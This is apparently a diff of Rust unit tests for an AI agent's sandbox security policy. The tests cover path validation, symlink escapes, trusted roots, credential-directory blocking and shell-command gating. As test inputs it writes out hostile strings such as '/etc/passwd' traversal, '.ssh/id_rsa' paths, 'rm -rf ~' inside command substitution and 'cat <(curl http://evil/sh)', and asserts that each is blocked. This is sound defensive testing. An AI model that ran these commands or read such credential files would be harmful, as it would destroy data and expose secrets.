-        assert!(!p.is_path_allowed("/anything"));
+        assert!(!p.is_path_string_allowed("/"));
+        assert!(!p.is_path_string_allowed("/anything"));
     }
 }
 
@@ -876,11 +1528,11 @@ fn checklist_all_system_dirs_blocked() {
         "/proc", "/sys", "/var", "/tmp",
     ] {
         assert!(
-            !p.is_path_allowed(dir),
+            !p.is_path_string_allowed(dir),
             "System dir should be blocked: {dir}"
         );
         assert!(
-            !p.is_path_allowed(&format!("{dir}/subpath")),
+            !p.is_path_string_allowed(&format!("{dir}/subpath")),
             "Subpath of system dir should be blocked: {dir}/subpath"
         );
     }
@@ -899,7 +1551,7 @@ fn checklist_sensitive_dotfiles_blocked() {
         "~/.config/secrets",
     ] {
         assert!(
-            !p.is_path_allowed(path),
+            !p.is_path_string_allowed(path),
             "Sensitive dotfile should be blocked: {path}"
         );
     }
@@ -908,9 +1560,9 @@ fn checklist_sensitive_dotfiles_blocked() {
 #[test]
 fn checklist_null_byte_injection_blocked() {
     let p = default_policy();
-    assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
-    assert!(!p.is_path_allowed("\0"));
-    assert!(!p.is_path_allowed("file\0"));
+    assert!(!p.is_path_string_allowed("safe\0/../../../etc/passwd"));
+    assert!(!p.is_path_string_allowed("\0"));
+    assert!(!p.is_path_string_allowed("file\0"));
 }
 
 #[test]
@@ -920,11 +1572,11 @@ fn checklist_workspace_only_blocks_all_absolute() {
         ..SecurityPolicy::default()
     };
     if cfg!(windows) {
-        assert!(!p.is_path_allowed("C:\\any\\absolute\\path"));
+        assert!(!p.is_path_string_allowed("C:\\any\\absolute\\path"));
     } else {
-        assert!(!p.is_path_allowed("/any/absolute/path"));
+        assert!(!p.is_path_string_allowed("/any/absolute/path"));
     }
-    assert!(p.is_path_allowed("relative/path.txt"));
+    assert!(p.is_path_string_allowed("relative/path.txt"));
 }
 
 #[test]
@@ -1060,7 +1712,7 @@ fn resolved_path_blocks_symlink_escape() {
 fn is_path_allowed_blocks_null_bytes() {
     let policy = default_policy();
     assert!(
-        !policy.is_path_allowed("file\0.txt"),
+        !policy.is_path_string_allowed("file\0.txt"),
         "paths with null bytes must be blocked"
     );
 }
@@ -1069,11 +1721,11 @@ fn is_path_allowed_blocks_null_bytes() {
 fn is_path_allowed_blocks_url_encoded_traversal() {
     let policy = default_policy();
     assert!(
-        !policy.is_path_allowed("..%2fetc%2fpasswd"),
+        !policy.is_path_string_allowed("..%2fetc%2fpasswd"),
         "URL-encoded path traversal must be blocked"
     );
     assert!(
-        !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
+        !policy.is_path_string_allowed("subdir%2f..%2f..%2fetc"),
         "URL-encoded parent dir traversal must be blocked"
     );
 }
@@ -1109,8 +1761,12 @@ fn validate_command_truncates_secrets_in_allowlist_miss_error() {
         "Err return leaked the secret past the 80-char truncation boundary: {err}"
     );
     assert!(
-        err.starts_with("Command not allowed by security policy: "),
-        "Err return should still carry the policy-decision prefix: {err}"
+        err.starts_with(crate::openhuman::security::POLICY_BLOCKED_MARKER),
+        "hard block should lead with the recognizable policy marker: {err}"
+    );
+    assert!(
+        err.contains("Command not allowed by security policy: "),
+        "Err return should still carry the policy-decision text: {err}"
     );
 }
 
@@ -1213,5 +1869,574 @@ fn validate_path_within_root_blocks_symlink_escape() {
     assert!(
         result.is_err(),
         "symlink escaping prompt root must be blocked"
+    );
+}
+
+// ── validate_path / validate_parent_path (async) ────────────────────────────
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_path_blocks_symlink_to_outside_workspace() {
+    let workspace = tempfile::tempdir().unwrap();
+    let outside = tempfile::tempdir().unwrap();
+    let secret = outside.path().join("secret.txt");
+    std::fs::write(&secret, "secret").unwrap();
+    let link = workspace.path().join("link.txt");
+    std::os::unix::fs::symlink(&secret, &link).unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: false,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    assert!(policy.validate_path("link.txt").await.is_err());
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_path_blocks_symlink_to_forbidden_path() {
+    let workspace = tempfile::tempdir().unwrap();
+    // /etc/hostname is readable on most Unix systems
+    let link = workspace.path().join("link");
+    std::os::unix::fs::symlink("/etc/hostname", &link).unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec!["/etc".to_string()],
+        ..SecurityPolicy::default()
+    };
+    assert!(policy.validate_path("link").await.is_err());
+}
+
+#[tokio::test]
+async fn validate_path_allows_regular_file_in_workspace() {
+    let workspace = tempfile::tempdir().unwrap();
+    let file = workspace.path().join("data.txt");
+    std::fs::write(&file, "hello").unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    let result = policy.validate_path("data.txt").await;
+    assert!(result.is_ok());
+    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
+}
+
+#[tokio::test]
+async fn validate_path_returns_err_for_nonexistent_path() {
+    let workspace = tempfile::tempdir().unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    assert!(policy.validate_path("does_not_exist.txt").await.is_err());
+}
+
+#[tokio::test]
+async fn validate_parent_path_allows_new_file() {
+    let workspace = tempfile::tempdir().unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    let result = policy.validate_parent_path("newfile.txt").await;
+    assert!(result.is_ok());
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_parent_path_blocks_symlinked_parent_dir() {
+    let workspace = tempfile::tempdir().unwrap();
+    let outside = tempfile::tempdir().unwrap();
+    let link_dir = workspace.path().join("subdir");
+    std::os::unix::fs::symlink(outside.path(), &link_dir).unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    assert!(policy
+        .validate_parent_path("subdir/newfile.txt")
+        .await
+        .is_err());
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_path_blocks_symlink_to_relative_forbidden_entry() {
+    // Regression: relative forbidden entries (e.g. "secrets") must match after
+    // canonicalization. Before the fix, "secrets" was never resolved against the
+    // workspace root, so workspace/link -> workspace/secrets/ passed the check.
+    let workspace = tempfile::tempdir().unwrap();
+    let secrets_dir = workspace.path().join("secrets");
+    std::fs::create_dir_all(&secrets_dir).unwrap();
+    let secret_file = secrets_dir.join("token.txt");
+    std::fs::write(&secret_file, "s3cr3t").unwrap();
+    let link = workspace.path().join("link");
+    std::os::unix::fs::symlink(&secrets_dir, &link).unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec!["secrets".to_string()],
+        ..SecurityPolicy::default()
+    };
+    // Direct path into the forbidden dir is blocked.
+    assert!(policy.validate_path("secrets/token.txt").await.is_err());
+    // Symlink that resolves into the forbidden dir is also blocked.
+    assert!(policy.validate_path("link/token.txt").await.is_err());
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_parent_path_blocks_forbidden_path() {
+    // Covers lines 888-896: the forbidden-path check inside validate_parent_path.
+    let workspace = tempfile::tempdir().unwrap();
+    let secrets_dir = workspace.path().join("secrets");
+    std::fs::create_dir_all(&secrets_dir).unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: true,
+        forbidden_paths: vec!["secrets".to_string()],
+        ..SecurityPolicy::default()
+    };
+    // Writing a new file directly into the forbidden dir must be blocked.
+    assert!(policy
+        .validate_parent_path("secrets/output.csv")
+        .await
+        .is_err());
+}
+
+// ── tilde expansion in validate_path / validate_parent_path ──────────────────
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_path_expands_tilde_before_workspace_join() {
+    // ~/... must be resolved against the real home dir, not literally joined onto
+    // workspace_dir. With workspace_only:false and no forbidden entries, is_path_string_allowed
+    // passes ~/file. After tilde expansion the file is outside the temp workspace, so we
+    // expect "Resolved path escapes workspace" — not "Failed to resolve path" (which would
+    // indicate the literal ~/... was appended to workspace_dir and canonicalize failed there).
+    let workspace = tempfile::tempdir().unwrap();
+    let home = dirs::home_dir().unwrap();
+    let target = home.join("openhuman_tilde_validate_path_test.txt");
+    std::fs::write(&target, "test").unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: false,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    let err = policy
+        .validate_path("~/openhuman_tilde_validate_path_test.txt")
+        .await
+        .unwrap_err();
+    let _ = std::fs::remove_file(&target);
+    assert!(
+        err.contains("Resolved path escapes workspace"),
+        "expected workspace-escape error (tilde correctly expanded); got: {err}"
+    );
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn validate_parent_path_expands_tilde_before_workspace_join() {
+    // Same as above but for validate_parent_path: writing ~/new_file.txt in
+    // non-workspace-only mode must escape-check via the real home path, not a literal ~/
+    // inside workspace_dir.
+    let workspace = tempfile::tempdir().unwrap();
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.path().to_path_buf(),
+        workspace_only: false,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+    let err = policy
+        .validate_parent_path("~/openhuman_tilde_validate_parent_test.txt")
+        .await
+        .unwrap_err();
+    assert!(
+        err.contains("Resolved parent path escapes workspace"),
+        "expected workspace-escape error (tilde correctly expanded); got: {err}"
+    );
+}
+
+// -- trusted_roots allow-list (Phase 1) ---------------------------
+
+use std::fs;
+use std::path::Path as StdPath;
+use std::path::PathBuf as StdPathBuf;
+
+fn trusted_policy(workspace: StdPathBuf, roots: Vec<TrustedRoot>) -> SecurityPolicy {
+    SecurityPolicy {
+        autonomy: AutonomyLevel::Supervised,
+        workspace_dir: workspace,
+        workspace_only: true,
+        trusted_roots: roots,
+        ..SecurityPolicy::default()
+    }
+}
+
+/// (workspace_dir, outside_dir) under a fresh temp root.
+fn ws_and_outside() -> (tempfile::TempDir, StdPathBuf, StdPathBuf) {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let workspace = tmp.path().join("workspace");
+    let outside = tmp.path().join("outside");
+    fs::create_dir_all(&workspace).unwrap();
+    fs::create_dir_all(&outside).unwrap();
+    (tmp, workspace, outside)
+}
+
+#[tokio::test]
+async fn trusted_read_root_allows_read_outside_workspace() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let file = outside.join("data.txt");
+    fs::write(&file, "hi").unwrap();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    let resolved = policy.validate_path(file.to_str().unwrap()).await;
+    assert!(
+        resolved.is_ok(),
+        "read in trusted root should succeed: {resolved:?}"
+    );
+}
+
+#[tokio::test]
+async fn trusted_read_root_blocks_write() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    let target = outside.join("new.txt");
+    let err = policy
+        .validate_parent_path(target.to_str().unwrap())
+        .await
+        .expect_err("write into a read-only trusted root must be rejected");
+    assert!(err.contains("escapes workspace"), "got: {err}");
+}
+
+#[tokio::test]
+async fn trusted_readwrite_root_allows_write() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    let target = outside.join("new.txt");
+    let resolved = policy.validate_parent_path(target.to_str().unwrap()).await;
+    assert!(
+        resolved.is_ok(),
+        "write in ReadWrite trusted root should succeed: {resolved:?}"
+    );
+}
+
+#[tokio::test]
+async fn credential_dir_blocked_even_inside_trusted_root() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let ssh = outside.join(".ssh");
+    fs::create_dir_all(&ssh).unwrap();
+    let key = ssh.join("id_rsa");
+    fs::write(&key, "SECRET").unwrap();
+    // Grant the entire `outside` tree read+write …
+    let policy = trusted_policy(
+        workspace,
+        vec![TrustedRoot {
+            path: outside.to_string_lossy().into_owned(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    // … the credential store inside it must still be unreachable.
+    let err = policy
+        .validate_path(key.to_str().unwrap())
+        .await
+        .expect_err("~/.ssh-style dir must stay blocked even inside a trusted root");
+    assert!(
+        err.contains("not allowed") || err.contains("credential"),
+        "got: {err}"
+    );
+}
+
+#[tokio::test]
+async fn path_outside_workspace_and_roots_blocked() {
+    let (_tmp, workspace, outside) = ws_and_outside();
+    let file = outside.join("data.txt");
+    fs::write(&file, "hi").unwrap();
+    // No trusted roots granted — outside the workspace stays blocked.
+    let policy = trusted_policy(workspace, vec![]);
+    let err = policy
+        .validate_path(file.to_str().unwrap())
+        .await
+        .expect_err("ungranted path outside workspace must be blocked");
+    assert!(
+        err.contains("not allowed") || err.contains("escapes"),
+        "got: {err}"
+    );
+}
+
+#[test]
+fn is_within_trusted_root_write_requires_readwrite() {
+    let policy = trusted_policy(
+        StdPathBuf::from("/ws"),
+        vec![TrustedRoot {
+            path: "/data".into(),
+            access: TrustedAccess::Read,
+        }],
+    );
+    assert!(policy.is_within_trusted_root(StdPath::new("/data/sub/x"), false));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/data/sub/x"), true));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/elsewhere/x"), false));
+}
+
+#[test]
+fn trusted_root_never_matches_credential_components() {
+    let policy = trusted_policy(
+        StdPathBuf::from("/ws"),
+        vec![TrustedRoot {
+            path: "/home/me".into(),
+            access: TrustedAccess::ReadWrite,
+        }],
+    );
+    assert!(policy.is_within_trusted_root(StdPath::new("/home/me/proj/file"), false));
+    assert!(!policy.is_within_trusted_root(StdPath::new("/home/me/.aws/credentials"), false));
+}
+
+// -- Full access bypasses the command allowlist (access modes) ---------------
+
+#[test]
+fn full_access_bypasses_command_allowlist() {
+    let p = full_policy();
+    // `mkdir` is NOT in the default allowed_commands, but Full bypasses the allowlist.
+    assert!(p.is_command_allowed("mkdir -p foo/bar"));
+    // Redirects / pipes / subshells that Supervised blocks are allowed under Full.
+    assert!(p.is_command_allowed("ls -la 2>/dev/null || echo none"));
+    assert!(p.is_command_allowed("echo hi > out.txt"));
+    assert!(p.is_command_allowed("python3 build.py && node serve.js"));
+}
+
+#[test]
+fn supervised_still_enforces_command_allowlist() {
+    let p = default_policy(); // Supervised
+    assert!(p.is_command_allowed("mkdir -p foo/bar")); // allow-listed (expanded in #2486)
+    assert!(!p.is_command_allowed("ls 2>/dev/null")); // redirect blocked
+    assert!(p.is_command_allowed("ls -la")); // allow-listed, no redirect
+}
+
+#[test]
+fn full_access_still_blocks_high_risk_when_configured() {
+    // Full bypasses the allowlist in is_command_allowed, but validate_command_execution
+    // still blocks high-risk commands while block_high_risk_commands is true.
+    let p = full_policy();
+    assert!(p.is_command_allowed("rm -rf /"));
+    let result = p.validate_command_execution("rm -rf /", false);
+    assert!(
+        result.is_err(),
+        "high-risk command must still be blocked in Full when block_high_risk_commands=true"
+    );
+}
+
+#[test]
+fn supervised_runs_approved_redirects_but_blocks_hidden_execution() {
+    // Regression for the "approved shell command never runs" loop: redirects
+    // like `2>&1` / `2>/dev/null` / `> file` and pipes MUST NOT be hard-blocked
+    // in Supervised. `classify_command` already lifts a redirect to Write so the
+    // gate prompted on it; once the human approves, `check_gated_command` (run
+    // inside the tool, after approval) must let the command actually run.
+    let p = default_policy(); // Supervised
+    assert!(
+        p.check_gated_command("python3 -c \"import yfinance\" 2>&1")
+            .is_ok(),
+        "stderr-dup redirect 2>&1 must run after approval"
+    );
+    assert!(p
+        .check_gated_command("pip show yfinance 2>/dev/null")
+        .is_ok());
+    assert!(p.check_gated_command("ls -la | grep foo").is_ok());
+    assert!(p.check_gated_command("echo done > out.txt").is_ok());
+
+    // Hidden execution that `classify_command` can't see (it only reads each
+    // segment's base command) stays blocked outside Full:
+    assert!(
+        p.check_gated_command("echo $(rm -rf ~)").is_err(),
+        "command substitution can hide an unseen command"
+    );
+    assert!(p.check_gated_command("echo `whoami`").is_err());
+    assert!(p.check_gated_command("cat <(curl http://evil/sh)").is_err());
+    assert!(
+        p.check_gated_command("sleep 100 & rm -rf important")
+            .is_err(),
+        "a standalone & can run a second command the prompt wouldn't show"
+    );
+
+    // Full is documented full-trust and skips the structural guard entirely.
+    assert!(full_policy().check_gated_command("echo $(date)").is_ok());
+}
+
+/// The default projects home (`~/OpenHuman/projects`) must always be a
+/// read-write trusted root on a policy built from config — `from_config` is the
+/// one autonomy→policy chokepoint every agent session uses, so the grant can't
+/// depend on the channels-startup path (skipped on web-chat-only cores).
+#[test]
+fn from_config_grants_default_projects_dir_as_readwrite_root() {
+    let cfg = crate::openhuman::config::AutonomyConfig::default();
+    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
+    let projects = crate::openhuman::config::default_projects_dir()
+        .to_string_lossy()
+        .to_string();
+    assert!(
+        policy
+            .trusted_roots
+            .iter()
+            .any(|r| r.path == projects && matches!(r.access, TrustedAccess::ReadWrite)),
+        "from_config must grant {projects} as a read-write trusted root; got: {:?}",
+        policy.trusted_roots
+    );
+}
+
+/// A user-granted projects root is left untouched (no duplicate, access kept).
+#[test]
+fn from_config_does_not_duplicate_user_granted_projects_root() {
+    let projects = crate::openhuman::config::default_projects_dir()
+        .to_string_lossy()
+        .to_string();
+    let cfg = crate::openhuman::config::AutonomyConfig {
+        trusted_roots: vec![TrustedRoot {
+            path: projects.clone(),
+            access: TrustedAccess::Read,
+        }],
+        ..crate::openhuman::config::AutonomyConfig::default()
+    };
+    let policy = SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"));
+    let matches: Vec<_> = policy
+        .trusted_roots
+        .iter()
+        .filter(|r| r.path == projects)
+        .collect();
+    assert_eq!(matches.len(), 1, "must not duplicate an existing entry");
+    assert!(
+        matches!(matches[0].access, TrustedAccess::Read),
+        "must preserve the user-granted access level"
+    );
+}
+
+// -- canonical_workspace cache ------------------------------------
+
+/// `validate_path` previously called `tokio::fs::canonicalize(&workspace_dir)`
+/// inline on every invocation. The `canonical_workspace` OnceCell now memoizes
+/// that result. This test pins the contract: the cell starts empty, is
+/// populated after the first `validate_path` call, and stays populated (same
+/// value) across subsequent calls — i.e. only one canonicalize per policy.
+#[tokio::test]
+async fn validate_path_caches_canonical_workspace_root() {
+    let tmp = tempfile::tempdir().unwrap();
+    let workspace = tmp.path().to_path_buf();
+    let file = workspace.join("hello.txt");
+    std::fs::write(&file, "hi").unwrap();
+
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.clone(),
+        // Disable workspace_only so we can refer to the temp workspace via
+        // its absolute path (the default policy blocks any absolute path
+        // when workspace_only=true). Clear forbidden_paths for the same
+        // reason — macOS tempdirs live under `/var/folders/…`.
+        workspace_only: false,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+
+    // Empty before first use.
+    assert!(
+        policy.canonical_workspace.get().is_none(),
+        "OnceCell must start empty so the first call hydrates it"
+    );
+
+    // First call hydrates the cache.
+    let r1 = policy
+        .validate_path(file.to_str().unwrap())
+        .await
+        .expect("first validate_path call succeeds");
+    let cached_after_first = policy
+        .canonical_workspace
+        .get()
+        .expect("first validate_path call must hydrate the OnceCell")
+        .clone();
+
+    // Subsequent calls reuse the cached value without re-canonicalizing.
+    for _ in 0..5 {
+        let r = policy
+            .validate_path(file.to_str().unwrap())
+            .await
+            .expect("repeated validate_path calls succeed");
+        assert_eq!(r, r1, "validate_path result must be stable across calls");
+        let cached_now = policy
+            .canonical_workspace
+            .get()
+            .expect("OnceCell stays populated after first hydration");
+        assert_eq!(
+            cached_now, &cached_after_first,
+            "cached workspace root must not change across calls"
+        );
+    }
+}
+
+/// `validate_parent_path` shares the same cache as `validate_path` — both go
+/// through `workspace_root()`. Hydrating via either entry point must be
+/// observable from the other.
+#[tokio::test]
+async fn validate_parent_path_uses_same_cache_as_validate_path() {
+    let tmp = tempfile::tempdir().unwrap();
+    let workspace = tmp.path().to_path_buf();
+
+    let policy = SecurityPolicy {
+        workspace_dir: workspace.clone(),
+        // Disable workspace_only so we can refer to the temp workspace via
+        // its absolute path (the default policy blocks any absolute path
+        // when workspace_only=true). Clear forbidden_paths for the same
+        // reason — macOS tempdirs live under `/var/folders/…`.
+        workspace_only: false,
+        forbidden_paths: vec![],
+        ..SecurityPolicy::default()
+    };
+
+    // Empty before first use.
+    assert!(policy.canonical_workspace.get().is_none());
+
+    // Hydrate via validate_parent_path (target file does not exist yet).
+    let target = workspace.join("not-yet-written.txt");
+    let _ = policy
+        .validate_parent_path(target.to_str().unwrap())
+        .await
+        .expect("validate_parent_path succeeds against an extant parent");
+    let cached = policy
+        .canonical_workspace
+        .get()
+        .expect("validate_parent_path must also hydrate the OnceCell")
+        .clone();
+
+    // A subsequent validate_path call must see the same cached root.
+    let other = workspace.join("hi.txt");
+    std::fs::write(&other, "x").unwrap();
+    let _ = policy.validate_path(other.to_str().unwrap()).await.unwrap();
+    assert_eq!(
+        policy.canonical_workspace.get(),
+        Some(&cached),
+        "validate_path must reuse the cache hydrated by validate_parent_path"
     );
 }
